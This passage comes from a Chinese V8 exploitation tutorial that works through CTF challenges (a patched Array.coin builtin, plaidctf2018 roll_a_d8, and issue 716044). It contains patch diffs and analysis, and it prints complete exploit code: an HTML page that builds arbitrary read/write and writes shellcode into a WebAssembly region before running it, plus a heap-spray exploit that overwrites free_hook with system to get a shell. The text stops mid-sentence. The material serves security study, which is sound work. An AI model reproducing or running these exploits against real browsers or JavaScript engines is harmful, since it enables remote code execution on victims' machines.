e7542dcd6b..059b54731b 100644--- a/src/init/bootstrapper.cc+++ b/src/init/bootstrapper.cc@@ -1663,6 +1663,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,                           false);     SimpleInstallFunction(isolate_, proto, &quot;copyWithin&quot;,                           Builtins::kArrayPrototypeCopyWithin, 2, false);+\tSimpleInstallFunction(isolate_, proto, &quot;coin&quot;,+\t\t\t\tBuiltins::kArrayCoin, 2, false);     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,                           Builtins::kArrayPrototypeFill, 1, false);     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,\n可以看到，patch为Array类型增加了一个coin函数，该函数功能就是如果37 &lt; array_length成立，就往37位置写入我们传入的value。这里就涉及到一个知识点了Object::ToNumber会调用对象里的valueOf函数，因此，当执行到这个函数时，还得回到js层去执行valueOf函数，然后再回来。然而，我们注意到一个顺序\n+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());++  Handle&lt;Object&gt; value;+  Handle&lt;Object&gt; length;+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+             isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+             isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(2)));\n先是取了elements，然后再去js层回调valueOf函数。假如我们在js层里的valueOf函数里趁机把arr的length扩大，那么Array会申请新的elements，原来那个elements被释放了，然而会到native层时，elements仍然指向的是之前那个elements位置，这就造成了UAF，而uint32_t array_length = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());是在之后执行，因此，我们一开始构造一个很小的arr，然后在valueOf里将arr扩大，那么即能绕过if(37 &lt; array_length)&#123;的判断，从原来的elements处溢出。\n漏洞利用我们可以利用溢出，修改后方的array对象的length，从而构造一个可以自由oob的数组。POC\nvar val = &#123;   valueOf:function() &#123;      a.length = 0x100;      return 0xffffffff;   &#125;&#125;;var a = new Array(30);var arb_double_arr = [1.1,2.2];a.coin(0x666,val); //溢出写arb_double_arr的size\n构造出oob数组以后，我们就可以利用之前介绍的方法利用了。exp\n&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;body&gt;    &lt;script&gt;var buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function i2f64(value) &#123;   dv.setBigUint64(0,BigInt(value),true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return dv.getBigUint64(0,true);&#125;var val = &#123;   valueOf:function() &#123;      a.length = 0x100;      return 0xffffffff;   &#125;&#125;;var a = new Array(30);var arb_double_arr = [1.1,2.2];a.coin(0x666,val); //溢出写arb_float_arr的size//获取double element的mapvar double_element_map = arb_double_arr[2];var b = new Array(30);var obj = &#123;&#125;;var obj_arr = [obj];var obj_element_map = arb_double_arr[0x13a];function addressOf(obj1) &#123;   obj_arr[0] = obj1;   arb_double_arr[0x13a] = double_element_map;   var addr = u64f(obj_arr[0]) - 0x1n;   arb_double_arr[0x13a] = obj_element_map;   return addr;&#125;function addressOf2(obj1) &#123;   obj_arr[0] = obj1;   arb_double_arr[0x13a] = double_element_map;   var addr = u64f(obj_arr[0]) - 0x1n;   arb_double_arr[0x13a] = obj_element_map;   return addr;&#125;function fakeObject(addr) &#123;   arb_double_arr[0x13a] = double_element_map;   obj_arr[0] = i2f64(addr + 1n);   arb_double_arr[0x13a] = obj_element_map;   var mobj = obj_arr[0];   return mobj;&#125;const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];var faker_addr = addressOf(faker);//alert(&#x27;wasm=&#x27;+addressOf(wasmInstance).toString(16));wasm_shellcode_ptr_addr = addressOf2(wasmInstance) + 0x88n;var element_addr = faker_addr - 0x50n;//print(&#x27;element_addr=&#x27; + element_addr.toString(16));//fake a ArrayBuffer&#x27;s Mapfaker[0] = i2f64(0n);faker[1] = i2f64(0x1900042317080808n);faker[2] = i2f64(0x00000000082003ffn);faker[3] = i2f64(0);//faker a ArrayBufferfaker[4] = i2f64(element_addr+0x1n); //mapfaker[5] = i2f64(0); //propertiesfaker[6] = i2f64(0); //elementsfaker[7] = p64f(0xffffffff,0); //lengthfaker[8] = i2f64(wasm_shellcode_ptr_addr);faker[9] = 0x2;var arb_ArrayBuffer = fakeObject(element_addr+0x20n);var adv = new DataView(arb_ArrayBuffer);var wasm_shellcode_addr = adv.getBigUint64(0,true);//alert(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));faker[8] = i2f64(wasm_shellcode_addr);//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   adv.setUint32(i*4,shellcode[i],true);&#125;//执行shellcodefunc();    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n0x03.01 plaidctf2018-roll_a_d8patch分析diff --git a/src/builtins/builtins-array-gen.cc b/src/builtins/builtins-array-gen.ccindex dcf3be4..3a74342 100644--- a/src/builtins/builtins-array-gen.cc+++ b/src/builtins/builtins-array-gen.cc@@ -1945,10 +1945,13 @@   void GenerateSetLength(TNode&lt;Context&gt; context, TNode&lt;Object&gt; array,                          TNode&lt;Number&gt; length) &#123;     Label fast(this), runtime(this), done(this);+    // TODO(delphick): We should be able to skip the fast set altogether, if the+    // length already equals the expected length, which it always is now on the+    // fast path.     // Only set the length in this stub if     // 1) the array has fast elements,     // 2) the length is writable,-    // 3) the new length is greater than or equal to the old length.+    // 3) the new length is equal to the old length.      // 1) Check that the array has fast elements.     // TODO(delphick): Consider changing this since it does an an unnecessary@@ -1970,10 +1973,10 @@       // BranchIfFastJSArray above.       EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime); -      // 3) If the created array already has a length greater than required,+      // 3) If the created array&#x27;s length does not match the required length,       //    then use the runtime to set the property as that will insert holes-      //    into the excess elements and/or shrink the backing store.-      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);+      //    into excess elements or shrink the backing store as appropriate.+      GotoIf(SmiNotEqual(length_smi, old_length), &amp;runtime);        StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,                                      length_smi);diff --git a/test/mjsunit/regress/regress-821137.js b/test/mjsunit/regress/regress-821137.jsnew file mode 100644index 0000000..639b3b9--- /dev/null+++ b/test/mjsunit/regress/regress-821137.js@@ -0,0 +1,27 @@+// Copyright 2018 the V8 project authors. All rights reserved.+// Use of this source code is governed by a BSD-style license that can be+// found in the LICENSE file.++// Tests that creating an iterator that shrinks the array populated by+// Array.from does not lead to out of bounds writes.+let oobArray = [];+let maxSize = 1028 * 8;+Array.from.call(function() &#123; return oobArray &#125;, &#123;[Symbol.iterator] : _ =&gt; (+  &#123;+    counter : 0,+    next() &#123;+      let result = this.counter++;+      if (this.counter &gt; maxSize) &#123;+        oobArray.length = 0;+        return &#123;done: true&#125;;+      &#125; else &#123;+        return &#123;value: result, done: false&#125;;+      &#125;+    &#125;+  &#125;+) &#125;);+assertEquals(oobArray.length, maxSize);++// iterator reset the length to 0 just before returning done, so this will crash+// if the backing store was not resized correctly.+oobArray[oobArray.length - 1] = 0x41414141;\n这题并不是patch引入漏洞，而是patch修复了漏洞，这是一个真实存在于v8中的历史漏洞，并且从patch中可以知道其代号为821137，我们在github上搜索一下代号找到一个commit，点击parent，获得其存在漏洞的那个commit为1dab065bb4025bdd663ba12e2e976c34c3fa6599，于是使用git checkout 1dab065bb4025bdd663ba12e2e976c34c3fa6599，然后编译v8即可。从patch中可以看到，已经有POC了，我们来分析一下POC的原理。首先，漏洞出在GenerateSetLength函数，那么我们查找一下该函数的上层调用，发现其在\n// ES #sec-array.fromTF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler)\n函数中被调用，处bootstrapper.cc中可以知道该函数是Array.from的具体实现\nSimpleInstallFunction(array_function, &quot;from&quot;, Builtins::kArrayFrom, 1,                      false);\n该函数的作用是通过一个迭代器为数组元素赋值，用法如下\nlet arr = [6,6,6,6];Array.from.call(function() &#123; return arr &#125;, &#123;[Symbol.iterator] : _ =&gt; (  &#123;    counter : 0,    next() &#123;      let result = this.counter++;      if (this.counter &gt; 10) &#123;        return &#123;done: true&#125;;      &#125; else &#123;        return &#123;value: result, done: false&#125;;      &#125;    &#125;  &#125;) &#125;);print(arr);\n输出如下\nroot@ubuntu:~/Desktop/plaidctf2018-roll_a_d8/x64.debug# ./d8 poc.js0,1,2,3,4,5,6,7,8,9\n其中[Symbol.iterator]是固定语法，表明这是一个迭代器，我们只需要重写迭代器里的next函数即可实现自己的逻辑。我们先看到TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler)函数中迭代的逻辑\nBIND(&amp;loop);    &#123;      // Loop while iterator is not done.      TNode&lt;Object&gt; next = CAST(iterator_assembler.IteratorStep(          context, iterator_record, &amp;loop_done, fast_iterator_result_map));      TVARIABLE(Object, value,                CAST(iterator_assembler.IteratorValue(                    context, next, fast_iterator_result_map)));      // If a map_function is supplied then call it (using this_arg as      // receiver), on the value returned from the iterator. Exceptions are      // caught so the iterator can be closed.      &#123;        Label next(this);        GotoIf(IsUndefined(map_function), &amp;next);        CSA_ASSERT(this, IsCallable(map_function));        Node* v = CallJS(CodeFactory::Call(isolate()), context, map_function,                         this_arg, value.value(), index.value());        GotoIfException(v, &amp;on_exception, &amp;var_exception);        value = CAST(v);        Goto(&amp;next);        BIND(&amp;next);      &#125;      // Store the result in the output object (catching any exceptions so the      // iterator can be closed).      Node* define_status =          CallRuntime(Runtime::kCreateDataProperty, context, array.value(),                      index.value(), value.value());      GotoIfException(define_status, &amp;on_exception, &amp;var_exception);      index = NumberInc(index.value());      // The spec requires that we throw an exception if index reaches 2^53-1,      // but an empty loop would take &gt;100 days to do this many iterations. To      // actually run for that long would require an iterator that never set      // done to true and a target array which somehow never ran out of memory,      // e.g. a proxy that discarded the values. Ignoring this case just means      // we would repeatedly call CreateDataProperty with index = 2^53.      CSA_ASSERT_BRANCH(this, [&amp;](Label* ok, Label* not_ok) &#123;        BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),                                           NumberConstant(kMaxSafeInteger), ok,                                           not_ok);      &#125;);      Goto(&amp;loop);    &#125;    BIND(&amp;loop_done);    &#123;      length = index;      Goto(&amp;finished);    &#125;\n可以看到当迭代完成也就是loop_done的时候，将迭代次数index赋值给了length变量，然后最后，调用GenerateSetLength函数将这个length设置到array对象里\n// Finally set the length on the output and return it. GenerateSetLength(context, array.value(), length.value());\n而GenerateSetLength函数将迭代次数与原来的数组长度进行对比，如果比原来的小，就调用js层的SetProperty函数将arr的length设置，否则直接将length值写入。这里看似没有什么问题，但是问题就发生在回调的逻辑里，这里是假设了array对象的length和迭代次数同步的递增，我们可以在迭代回调函数里趁机把array对象的length给改小，然后进入GenerateSetLength(context, array.value(), length.value())函数时就可以绕过 GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);函数，直接将迭代次数设置为array对象的length。调用SetProperty和使用StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset, length_smi);来设置length的不同之处在于SetProperty是js层的，调用它来设置会顺便将elements扩容或收缩，而StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset, length_smi);函数不回调，直接在内存里写上这个值。因此，不扩容，就造成了溢出。\n漏洞利用POC\nlet arr = [1.1];Array.from.call(function() &#123; return arr &#125;, &#123;[Symbol.iterator] : _ =&gt; (  &#123;    counter : 0,    next() &#123;      let result = this.counter++;      if (this.counter &gt; 10) &#123;        arr.length = 1;        return &#123;done: true&#125;;      &#125; else &#123;        return &#123;value: result, done: false&#125;;      &#125;    &#125;  &#125;) &#125;);%DebugPrint(arr);%SystemBreak();\n可以看到length为10，然而elements的长度值却为1由此，我们利用溢出，改写ArrayBuffer的length和backing_store即可实现任意地址读写exp\nvar buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function i2f64(value) &#123;   dv.setBigUint64(0,BigInt(value),true);   return dv.getFloat64(0,true);&#125;function u64_l(value) &#123;   dv.setFloat64(0,value,true);   return dv.getUint32(0,true);&#125;function u64_h(value) &#123;   dv.setFloat64(0,value,true);   return dv.getUint32(4,true);&#125;let obj = &#123;&#125;;var spray_size = 0x1000;var arr = new Array(spray_size);let oobArray = [];//转为double arrayoobArray[0] = 1.1;oobArray.length = 0;let maxSize = 1024*8;Array.from.call(function() &#123; return oobArray &#125;, &#123;[Symbol.iterator] : _ =&gt; (  &#123;    counter : 0,    next() &#123;      let result = this.counter++;      if (this.counter &gt; maxSize) &#123;        oobArray.length = 0x1;        //堆喷        for (var i=0;i&lt;spray_size;i++) &#123;           arr[i] = new ArrayBuffer(0x1234);        &#125;        return &#123;done: true&#125;;      &#125; else &#123;        return &#123;value: result, done: false&#125;;      &#125;    &#125;  &#125;) &#125;);var backing_store_h = u64_h(oobArray[5]);var backing_stroe_l = u64_l(oobArray[5]);print(backing_store_h.toString(16) + backing_stroe_l.toString(16));//修改ArrayBuffer的byteLengthoobArray[4] = p64f(0,0x666666);var oob_buf;//寻找被成功修改的那个ArrayBufferfor (var i=0;i&lt;spray_size;i++) &#123;   if (arr[i].byteLength != 0x1234) &#123;      oob_buf = arr[i];      print(&quot;found!!&quot; + arr[i].byteLength);   &#125;&#125;if (oob_buf == null) &#123;   console.log(&quot;error!&quot;);&#125;var oob_dv  = new DataView(oob_buf);function read64(addr_h,addr_l) &#123;   oobArray[5] = p64f(addr_l,addr_h);   return oob_dv.getFloat64(0,true);&#125;function write64(addr_h,addr_l,value) &#123;   oobArray[5] = p64f(addr_l,addr_h);   oob_dv.setFloat64(0,value,true);&#125;var d = read64(backing_store_h,backing_stroe_l + 0x1820);var elf_base_h = u64_h(d);var elf_base_l = u64_l(d) - 0xb83338;d = read64(elf_base_h,elf_base_l + 0xB9A118);var libc_base_h = u64_h(d);var libc_base_l = u64_l(d) - 0x21ab0;var system_l = libc_base_l + 0x4f4e0;var free_hook_l = libc_base_l + 0x3ed8e8;console.log(&quot;[+]libc_base=&quot; + libc_base_h.toString(16) + libc_base_l.toString(16));console.log(&quot;[+]system=&quot; + libc_base_h.toString(16) + system_l.toString(16));console.log(&quot;[+]free_hook=&quot; + libc_base_h.toString(16) + free_hook_l.toString(16));//需要执行的命令var shell_buf = new ArrayBuffer(0x30);var str = &quot;/bin/sh\\x00&quot;;var bufView = new Uint8Array(shell_buf);for (var i=0, strLen=str.length; i&lt;strLen; i++) &#123;   bufView[i] = str.charCodeAt(i);&#125;//写free_hookwrite64(libc_base_h,free_hook_l,p64f(system_l,libc_base_h));\n0x03.02 issue 716044patch分析diff --git a/src/builtins/builtins-array-gen.cc b/src/builtins/builtins-array-gen.ccindex 32dd9b5..316c0b7 100644--- a/src/builtins/builtins-array-gen.cc+++ b/src/builtins/builtins-array-gen.cc@@ -15,13 +15,11 @@       : CodeStubAssembler(state),         k_(this, MachineRepresentation::kTagged),         a_(this, MachineRepresentation::kTagged),-        to_(this, MachineRepresentation::kTagged, SmiConstant(0)) &#123;&#125;--  typedef std::function&lt;Node*(ArrayBuiltinCodeStubAssembler* masm)&gt;-      BuiltinResultGenerator;+        to_(this, MachineRepresentation::kTagged, SmiConstant(0)),+        fully_spec_compliant_(this, &#123;&amp;k_, &amp;a_, &amp;to_&#125;) &#123;&#125;    typedef std::function&lt;void(ArrayBuiltinCodeStubAssembler* masm)&gt;-      BuiltinResultIndexInitializer;+      BuiltinResultGenerator;    typedef std::function&lt;Node*(ArrayBuiltinCodeStubAssembler* masm,                               Node* k_value, Node* k)&gt;@@ -30,7 +28,7 @@   typedef std::function&lt;void(ArrayBuiltinCodeStubAssembler* masm)&gt;       PostLoopAction; -  Node* ForEachResultGenerator() &#123; return UndefinedConstant(); &#125;+  void ForEachResultGenerator() &#123; a_.Bind(UndefinedConstant()); &#125;    Node* ForEachProcessor(Node* k_value, Node* k) &#123;     CallJS(CodeFactory::Call(isolate()), context(), callbackfn(), this_arg(),@@ -38,7 +36,7 @@     return a();   &#125; -  Node* SomeResultGenerator() &#123; return FalseConstant(); &#125;+  void SomeResultGenerator() &#123; a_.Bind(FalseConstant()); &#125;    Node* SomeProcessor(Node* k_value, Node* k) &#123;     Node* value = CallJS(CodeFactory::Call(isolate()), context(), callbackfn(),@@ -51,7 +49,7 @@     return a();   &#125; -  Node* EveryResultGenerator() &#123; return TrueConstant(); &#125;+  void EveryResultGenerator() &#123; a_.Bind(TrueConstant()); &#125;    Node* EveryProcessor(Node* k_value, Node* k) &#123;     Node* value = CallJS(CodeFactory::Call(isolate()), context(), callbackfn(),@@ -64,7 +62,7 @@     return a();   &#125; -  Node* ReduceResultGenerator() &#123; return this_arg(); &#125;+  void ReduceResultGenerator() &#123; return a_.Bind(this_arg()); &#125;    Node* ReduceProcessor(Node* k_value, Node* k) &#123;     VARIABLE(result, MachineRepresentation::kTagged);@@ -91,9 +89,9 @@     BIND(&amp;ok);   &#125; -  Node* FilterResultGenerator() &#123;+  void FilterResultGenerator() &#123;     // 7. Let A be ArraySpeciesCreate(O, 0).-    return ArraySpeciesCreate(context(), o(), SmiConstant(0));+    a_.Bind(ArraySpeciesCreate(context(), o(), SmiConstant(0)));   &#125;    Node* FilterProcessor(Node* k_value, Node* k) &#123;@@ -162,13 +160,53 @@     return a();   &#125; -  Node* MapResultGenerator() &#123;-    // 5. Let A be ? ArraySpeciesCreate(O, len).-    return ArraySpeciesCreate(context(), o(), len_);+  void MapResultGenerator() &#123;+    Label runtime(this), done(this, &#123;&amp;a_&#125;);+    GotoIf(DoesntHaveInstanceType(o(), JS_ARRAY_TYPE), &amp;runtime);+    Node* o_map = LoadMap(o());+    Node* const initial_array_prototype = LoadContextElement(+        LoadNativeContext(context()), Context::INITIAL_ARRAY_PROTOTYPE_INDEX);+    Node* proto = LoadMapPrototype(o_map);+    GotoIf(WordNotEqual(proto, initial_array_prototype), &amp;runtime);++    Node* species_protector = SpeciesProtectorConstant();+    Node* value = LoadObjectField(species_protector, Cell::kValueOffset);+    Node* const protector_invalid = SmiConstant(Isolate::kProtectorInvalid);+    GotoIf(WordEqual(value, protector_invalid), &amp;runtime);++    Node* const initial_array_constructor = LoadContextElement(+        LoadNativeContext(context()), Context::ARRAY_FUNCTION_INDEX);+    a_.Bind(ConstructJS(CodeFactory::Construct(isolate()), context(),+                        initial_array_constructor, len_));+    Goto(&amp;done);++    BIND(&amp;runtime);+    &#123;+      // 5. Let A be ? ArraySpeciesCreate(O, len).+      Node* constructor =+          CallRuntime(Runtime::kArraySpeciesConstructor, context(), o());+      a_.Bind(ConstructJS(CodeFactory::Construct(isolate()), context(),+                          constructor, len_));+      Goto(&amp;fully_spec_compliant_);+    &#125;+    BIND(&amp;done);   &#125; -  Node* MapProcessor(Node* k_value, Node* k) &#123;-    //  i. Let kValue be ? Get(O, Pk). Performed by the caller of MapProcessor.+  Node* SpecCompliantMapProcessor(Node* k_value, Node* k) &#123;+    //  i. Let kValue be ? Get(O, Pk). Performed by the caller of+    //  SpecCompliantMapProcessor.+    // ii. Let mappedValue be ? Call(callbackfn, T, kValue, k, O).+    Node* mappedValue = CallJS(CodeFactory::Call(isolate()), context(),+                               callbackfn(), this_arg(), k_value, k, o());++    // iii. Perform ? CreateDataPropertyOrThrow(A, Pk, mappedValue).+    CallRuntime(Runtime::kCreateDataProperty, context(), a(), k, mappedValue);+    return a();+  &#125;++  Node* FastMapProcessor(Node* k_value, Node* k) &#123;+    //  i. Let kValue be ? Get(O, Pk). Performed by the caller of+    //  FastMapProcessor.     // ii. Let mappedValue be ? Call(callbackfn, T, kValue, k, O).     Node* mappedValue = CallJS(CodeFactory::Call(isolate()), context(),                                callbackfn(), this_arg(), k_value, k, o());@@ -268,8 +306,7 @@       const CallResultProcessor&amp; processor, const PostLoopAction&amp; action,       const Callable&amp; slow_case_continuation,       ForEachDirection direction = ForEachDirection::kForward) &#123;-    Label non_array(this), slow(this, &#123;&amp;k_, &amp;a_, &amp;to_&#125;),-        array_changes(this, &#123;&amp;k_, &amp;a_, &amp;to_&#125;);+    Label non_array(this), array_changes(this, &#123;&amp;k_, &amp;a_, &amp;to_&#125;);      // TODO(danno): Seriously? Do we really need to throw the exact error     // message on null and undefined so that the webkit tests pass?@@ -336,11 +373,11 @@       k_.Bind(NumberDec(len()));     &#125; -    a_.Bind(generator(this));+    generator(this); -    HandleFastElements(processor, action, &amp;slow, direction);+    HandleFastElements(processor, action, &amp;fully_spec_compliant_, direction); -    BIND(&amp;slow);+    BIND(&amp;fully_spec_compliant_);      Node* result =         CallStub(slow_case_continuation, context(), receiver(), callbackfn(),@@ -440,7 +477,7 @@     &#125; else &#123;       k_.Bind(NumberDec(len()));     &#125;-    a_.Bind(generator(this));+    generator(this);     Node* elements_type = LoadInstanceType(LoadElements(o_));     Switch(elements_type, &amp;unexpected_instance_type, instance_types.data(),            label_ptrs.data(), labels.size());@@ -690,6 +727,7 @@   Variable k_;   Variable a_;   Variable to_;+  Label fully_spec_compliant_; &#125;;  TF_BUILTIN(FastArrayPush, CodeStubAssembler) &#123;@@ -1168,7 +1206,7 @@                                             len, to);    GenerateIteratingArrayBuiltinLoopContinuation(-      &amp;ArrayBuiltinCodeStubAssembler::MapProcessor,+      &amp;ArrayBuiltinCodeStubAssembler::SpecCompliantMapProcessor,       &amp;ArrayBuiltinCodeStubAssembler::NullPostLoopAction); &#125; @@ -1187,7 +1225,7 @@    GenerateIteratingArrayBuiltinBody(       &quot;Array.prototype.map&quot;, &amp;ArrayBuiltinCodeStubAssembler::MapResultGenerator,-      &amp;ArrayBuiltinCodeStubAssembler::MapProcessor,+      &amp;ArrayBuiltinCodeStubAssembler::FastMapProcessor,       &amp;ArrayBuiltinCodeStubAssembler::NullPostLoopAction,       Builtins::CallableFor(isolate(), Builtins::kArrayMapLoopContinuation)); &#125;diff --git a/src/code-stub-assembler.h b/src/code-stub-assembler.hindex dbdd5f0..ba35e25 100644--- a/src/code-stub-assembler.h+++ b/src/code-stub-assembler.h@@ -51,7 +51,8 @@   V(Tuple2Map, Tuple2Map)                             \\   V(Tuple3Map, Tuple3Map)                             \\   V(UndefinedValue, Undefined)                        \\-  V(WeakCellMap, WeakCellMap)+  V(WeakCellMap, WeakCellMap)                         \\+  V(SpeciesProtector, SpeciesProtector)  // Provides JavaScript-specific &quot;macro-assembler&quot; functionality on top of the // CodeAssembler. By factoring the JavaScript-isms out of the CodeAssembler,diff --git a/test/mjsunit/mjsunit.status b/test/mjsunit/mjsunit.statusindex 60fc9e6..25bc972 100644--- a/test/mjsunit/mjsunit.status+++ b/test/mjsunit/mjsunit.status@@ -65,6 +65,7 @@   # Too slow in debug mode for validation of elements.   &#x27;regress/regress-430201&#x27;: [PASS, [&#x27;mode == debug&#x27;, SKIP]],   &#x27;regress/regress-430201b&#x27;: [PASS, [&#x27;mode == debug&#x27;, SKIP]],+  &#x27;regress/regress-716044&#x27;: [PASS, [&#x27;mode == debug&#x27;, SKIP]],    ##############################################################################   # Too slow in debug mode for GC stress mode.diff --git a/test/mjsunit/regress/regress-716044.js b/test/mjsunit/regress/regress-716044.jsnew file mode 100644index 0000000..264424c--- /dev/null+++ b/test/mjsunit/regress/regress-716044.js@@ -0,0 +1,25 @@+// Copyright 2017 the V8 project authors. All rights reserved.+// Use of this source code is governed by a BSD-style license that can be+// found in the LICENSE file.++// Flags: --verify-heap++class Array1 extends Array &#123;+  constructor(len) &#123;+      super(1);+    &#125;+&#125;;++class MyArray extends Array &#123;+  static get [Symbol.species]() &#123;+      return Array1;+    &#125;+&#125;++a = new MyArray();++for (var i = 0; i &lt; 100000; i++) &#123;+  a.push(1);+&#125;++a.map(function(x) &#123; return 42; &#125;);\n这题与前一题类似，也是一个真实的v8历史漏洞，代号为716044。从patch中，我们看到其中MapResultGenerator函数的变化较大，我们查找其的上层调用，发现其在TF_BUILTIN(ArrayMap, ArrayBuiltinCodeStubAssembler)函数中被调用\nGenerateIteratingArrayBuiltinBody(    &quot;Array.prototype.map&quot;, &amp;ArrayBuiltinCodeStubAssembler::MapResultGenerator,    &amp;ArrayBuiltinCodeStubAssembler::MapProcessor,    &amp;ArrayBuiltinCodeStubAssembler::NullPostLoopAction,    Builtins::CallableFor(isolate(), Builtins::kArrayMapLoopContinuation));\n可以知道这是Array.prototype.map函数的具体实现，该函数的作用是将键值进行映射\nvar a = [1,2,3,4];print(a.map(function(x) &#123; return x+1;  &#125;));\n其输出为\nroot@ubuntu:~/Desktop/issue_716044/x64.release# ./d8 t.js2,3,4,5\n即该函数接收一个函数对象，作为映射的变换函数，映射的值来源于调用数组对象。继续分析GenerateIteratingArrayBuiltinBody函数\nvoid GenerateIteratingArrayBuiltinBody(      const char* name, const BuiltinResultGenerator&amp; generator,      const CallResultProcessor&amp; processor, const PostLoopAction&amp; action,      const Callable&amp; slow_case_continuation,      ForEachDirection direction = ForEachDirection::kForward) &#123;    Label non_array(this), slow(this, &#123;&amp;k_, &amp;a_, &amp;to_&#125;),        array_changes(this, &#123;&amp;k_, &amp;a_, &amp;to_&#125;);    // TODO(danno): Seriously? Do we really need to throw the exact error    // message on null and undefined so that the webkit tests pass?    Label throw_null_undefined_exception(this, Label::kDeferred);    GotoIf(WordEqual(receiver(), NullConstant()),           &amp;throw_null_undefined_exception);    GotoIf(WordEqual(receiver(), UndefinedConstant()),           &amp;throw_null_undefined_exception);    // By the book: taken directly from the ECMAScript 2015 specification    // 1. Let O be ToObject(this value).    // 2. ReturnIfAbrupt(O)\t//o_是原数组对象    o_ = CallStub(CodeFactory::ToObject(isolate()), context(), receiver());    // 3. Let len be ToLength(Get(O, &quot;length&quot;)).    // 4. ReturnIfAbrupt(len).    VARIABLE(merged_length, MachineRepresentation::kTagged);    Label has_length(this, &amp;merged_length), not_js_array(this);    GotoIf(DoesntHaveInstanceType(o(), JS_ARRAY_TYPE), &amp;not_js_array);    merged_length.Bind(LoadJSArrayLength(o()));    Goto(&amp;has_length);    BIND(&amp;not_js_array);    Node* len_property =        GetProperty(context(), o(), isolate()-&gt;factory()-&gt;length_string());    merged_length.Bind(        CallStub(CodeFactory::ToLength(isolate()), context(), len_property));    Goto(&amp;has_length);    BIND(&amp;has_length);\t//len值为原数组的长度    len_ = merged_length.value();    // 5. If IsCallable(callbackfn) is false, throw a TypeError exception.    Label type_exception(this, Label::kDeferred);    Label done(this);    GotoIf(TaggedIsSmi(callbackfn()), &amp;type_exception);    Branch(IsCallableMap(LoadMap(callbackfn())), &amp;done, &amp;type_exception);    BIND(&amp;throw_null_undefined_exception);    &#123;      CallRuntime(          Runtime::kThrowTypeError, context(),          SmiConstant(MessageTemplate::kCalledOnNullOrUndefined),          HeapConstant(isolate()-&gt;factory()-&gt;NewStringFromAsciiChecked(name)));      Unreachable();    &#125;    BIND(&amp;type_exception);    &#123;      CallRuntime(Runtime::kThrowTypeError, context(),                  SmiConstant(MessageTemplate::kCalledNonCallable),                  callbackfn());      Unreachable();    &#125;    BIND(&amp;done);    // 6. If thisArg was supplied, let T be thisArg; else let T be undefined.    // [Already done by the arguments adapter]    if (direction == ForEachDirection::kForward) &#123;      // 7. Let k be 0.      k_.Bind(SmiConstant(0));    &#125; else &#123;      k_.Bind(NumberDec(len()));    &#125;    //调用MapResultGenerator函数创建用于保存结果的数组    a_.Bind(generator(this));    HandleFastElements(processor, action, &amp;slow, direction);    BIND(&amp;slow);   //调用映射函数生成映射，并将结果保存到a_中    Node* result =        CallStub(slow_case_continuation, context(), receiver(), callbackfn(),                 this_arg(), a_.value(), o(), k_.value(), len(), to_.value());    ReturnFromBuiltin(result);  &#125;\n而MapResultGenerator函数调用了ArraySpeciesCreate，继续跟踪\nNode* MapResultGenerator() &#123;  // 5. Let A be ? ArraySpeciesCreate(O, len).  return ArraySpeciesCreate(context(), o(), len_);&#125;\n而ArraySpeciesCreate函数如下\nNode* CodeStubAssembler::ArraySpeciesCreate(Node* context, Node* originalArray,                                            Node* len) &#123;  // TODO(mvstanton): Install a fast path as well, which avoids the runtime  // call.  Node* constructor =      CallRuntime(Runtime::kArraySpeciesConstructor, context, originalArray);  return ConstructJS(CodeFactory::Construct(isolate()), context, constructor,                     len);&#125;\n回调了js层的SpeciesConstructor函数，目的是为了调用合适的构造函数，比如如下\nclass MyArray extends Array &#123;  static get 